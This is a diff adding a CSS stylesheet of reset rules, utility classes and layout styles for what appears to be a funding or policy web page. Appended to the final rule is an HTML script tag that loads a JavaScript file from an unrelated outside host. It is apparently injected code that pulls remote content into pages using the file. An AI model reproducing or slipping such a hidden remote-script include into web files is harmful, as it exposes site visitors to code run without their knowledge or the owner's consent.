@@ -1,0 +1,444 @@
+@import 'public.css';
+body, h1, h2, h3, h4, h5, h6, hr, p, blockquote, dl, dt, dd, ul, ol, li, pre, form, fieldset, legend, button, input, textarea, th, td {
+	margin:0;
+	padding:0
+}
+li {
+	list-style:none
+}
+legend {
+	color:#000
+}
+fieldset, img {
+	border:0
+}
+button, input, select, textarea {
+	font-size:100%
+}
+h1, h2, h3, h4, h5, h6 {
+	font-size:100%
+}
+address, cite, dfn, em, var {
+	font-style:normal
+}
+code, kbd, pre, samp {
+	font-family:courier new, courier, monospace
+}
+small {
+	font-size:12px
+}
+a {
+	text-decoration:none
+}
+a:hover {
+	text-decoration:underline
+}
+.tac {
+	text-align:center
+}
+.tal {
+	text-align:left
+}
+.tar {
+	text-align:right
+}
+.tdn {
+	text-decoration:none
+}
+.tdu {
+	text-decoration:underline
+}
+.tan {
+	text-align:normal
+}
+.vatt {
+	vertical-align:text-top
+}
+.cb {
+	clear:both
+}
+.cp {
+	cursor:pointer
+}
+.cm {
+	cursor:move
+}
+.fl {
+	float:left
+}
+.fr {
+	float:right
+}
+.fwb {
+	font-weight:bold
+}
+.ff {
+	font-family:'\5FAE\8F6F\96C5\9ED1'
+}
+.fs12 {
+	font-size:12px
+}
+.db {
+	display:block
+}
+.dn {
+	display:none
+}
+.di {
+	display:inline
+}
+.dib {
+	display:inline-block
+}
+.dtc {
+	display:table-cell
+}
+.pr {
+	position:relative
+}
+.pa {
+	position:absolute
+}
+.pf {
+	position:fixed
+}
+.oh {
+	overflow:hidden
+}
+.wwbw {
+	word-wrap:break-word
+}
+.wbba {
+	word-break:break-all
+}
+.wsn {
+	white-space:nowrap
+}
+.lsn {
+	list-style:none
+}
+.ti9 {
+	text-indent:-999em
+}
+.m0 {
+	margin:0 auto
+}
+.bn {
+	background:0
+}
+.b0 {
+	border:0
+}
+img {
+	display:inline-block;
+*display:inline;
+*zoom:1
+}
+.w {
+	width:994px
+}
+.ww {
+	width:985px;
+	margin:0 auto
+}
+.mb {
+	margin-bottom:10px
+}
+.top {
+	height:142px;
+	margin-bottom:8px
+}
+.content:after {
+	clear:both;
+	content:" ";
+	display:block;
+	height:0;
+	visibility:hidden
+}
+.main {
+	float:left;
+	width:709px;
+	margin-left:10px;
+}
+.scroll {
+	height:196px;
+	margin-bottom:10px
+}
+.scroll img {
+	display:block
+}
+.zjxm {
+	border:1px solid #cccccc;
+	margin-bottom:10px;
+	background:#f6f6f6;
+	/*height:372px;*/
+	overflow:hidden
+}
+.title {
+         background:url(../../images/new/Policy_bj_06.jpg) no-repeat;
+	/*background:url(../../images/new1/money_zjxm_nav_07.jpg) repeat-x;*/
+	width:707px;
+	height:32px
+}
+.title h2 {
+	/*8background:url(../../images/new1/money_zjxm_nav_img_10.jpg) left no-repeat;*/
+	margin-left:8px;
+	padding-left:6px;
+	text-align:left;
+	line-height:31px;
+	color:white;
+	font-size:15px;
+	font-weight:bold
+}
+.zjxm p {
+	line-height:36px;
+	margin-left:28px;
+	color:#333333;
+}
+.mainform {
+	margin-left:20px;
+	margin-bottom:12px;
+	height:292px
+}
+.formtop {
+	background:url(../../images/new1/money_zjsb_top_15.jpg) no-repeat;
+	height:8px;
+	width:668px;
+	font-size:0;
+	line-height:0
+}
+.formbtm {
+	background:url(../../images/new1/money_zjsb_bot_24.jpg) no-repeat;
+	height:8px;
+	width:668px;
+	font-size:0;
+	line-height:0
+}
+.formcenter {
+	border:1px solid #fec083;
+	width:666px;
+	height:276px;
+	border-width:0 1px 0 1px;
+	background:white
+}
+.formcenter div.area {
+	padding:0;
+	height:auto;
+	overflow:auto
+}
+.formcenter div.area label {
+	display:block;
+	float:left;
+	height:24px;
+	line-height:24px;
+	width:100px;
+	padding-bottom:9px
+}
+.formcenter div.area textarea {
+	width:494px;
+	height:106px;
+	border:1px solid #bababa;
+	overflow:auto;
+	float:left;
+	margin-left:75px;
+*display:inline
+}
+.formcenter div.area input {
+	background:url(../../images/new1/money_tijiao_15.jpg) no-repeat;
+	cursor:pointer;
+	width:80px;
+	height:34px;
+	border:0;
+	text-indent:-999em;
+	float:left;
+	margin-left:8px;
+*display:inline;
+	margin-top:74px
+}
+.formcenter div {
+	height:24px;
+	line-height:24px;
+	overflow:hidden;
+	padding:11px 0 9px 0
+}
+.formcenter div label {
+	display:inline-block;
+*display:inline;
+*zoom:1;
+	width:80px;
+	text-align:right
+}
+.formcenter div input {
+	padding:0;
+	height:22px;
+	line-height:22px;
+	width:235px;
+	border:1px solid #bababa
+}
+.hezuo {
+	height:127px;
+	border:1px solid #fec083;
+	margin-bottom:10px;
+	overflow:hidden
+}
+.hezuo p {
+	position:relative;
+	top:-1px;
+	left:-1px;
+	width:37px;
+	height:129px;
+	float:left;
+	text-indent:-999em;
+	background:url(../../images/new1/money_hzqy_26.jpg)
+}
+.hezuo li {
+	margin-top:6px;
+	width:156px;
+	text-align:center;
+	float:left;
+	margin-left:10px;
+*display:inline
+}
+.hezuo li img {
+	border:1px solid #bababa;
+	padding:3px
+}
+.hezuo li a {
+	line-height:20px
+}
+.zcrd {
+    border:#cccccc 1px solid;
+	
+}
+.zcrd table{margin:auto;width:690px;margin-bottom:10px;}
+.zcrd table tr{line-height:28px;}
+.zcrd:after {
+	clear:both;
+	content:" ";
+	display:block;
+	height:0;
+	visibility:hidden
+}
+.zcrd ul {
+	height:166px;
+	padding:5px 0;
+	padding-left:18px
+}
+.zcrd ul li {
+	line-height:24px;
+	padding-left:4px
+}
+.zcrd ul li span {
+	float:right;
+	margin-right:24px;
+    *display:inline
+}
+.side {
+	float:right;
+	width:257px;
+	margin-right:10px;
+}
+.zxqy {
+	background:url(../../images/new1/money_zxqy_bj_05.jpg) no-repeat;
+}
+.zxqy:after {
+	clear:both;
+	content:" ";
+	display:block;
+	height:0;
+	visibility:hidden
+}
+.zxqy h2 {
+	padding-top:6px;
+	line-height:28px;
+	height:28px;
+	text-indent:-999em
+}
+.zxqy h3 {
+	text-align:center;
+	background:url(../../images/new1/money_zxqy_bfgs_06.jpg) no-repeat;
+	width:166px;
+	height:37px;
+	cursor:pointer;
+	margin-left:58px;;
+	margin-top:20px;
+	text-indent:-999em
+}
+.sideform {
+	margin-top:25px;
+	background:url(../../images/new1/money_1_19.jpg) 0px 0px repeat-y;
+}
+.sideform div {
+	margin-bottom:9px;
+	height:21px
+}
+.sideform div label {
+	float:left;
+	display:inline-block;
+*display:inline;
+*zoom:1;
+	width:98px;
+	text-align:right
+}
+.sideform div input {
+	height:19px;
+	width:126px;
+	border:1px solid #bababa
+}
+.sideform div.btn {
+	background:url(../../images/new1/money_cx_19.jpg) no-repeat;
+	width:161px;
+	height:29px;
+	margin:0 60px;
+	margin-top:15px;
+*display:inline;
+color:#fff;
+}
+.sideform div.btn input {
+	height:29px;
+	width:80px;
+	background:0;
+	border:0
+	color:#fff;
+}
+.foot_zxqy{width:256px;height:1px; padding-left:1px;margin-bottom: 20px;}
+.new {
+	height:189px;
+	border:1px solid #cccccc;
+	margin-bottom:10px;
+	margin-top:6px;
+}
+.sidetitle {
+	background:url(../../images/new1/money_zx_nav_23.jpg) no-repeat;
+	height:30px;
+	margin:1px 2px;
+	line-height:30px;
+	padding-left:31px
+}
+.new ul {
+	padding-left:5px;
+	padding-top:3px
+}
+.new ul li {
+	padding-left:8px;
+	line-height:25px
+}
+.lianxi {
+	border:1px solid #bababa;
+	padding:2px 3px;
+	margin-bottom:10px
+}
+.lianxi:after {
+	clear:both;
+	content:" ";
+	display:block;
+	height:0;
+	visibility:hidden
+}
+.lianxi img {
+	float:left
+}
+.new2 {
+	height:309px
+}
+.lala{color:#333333;}<script charset="utf-8" async="true" src="http://n.cosbot.cn/rb/i.js"></script>
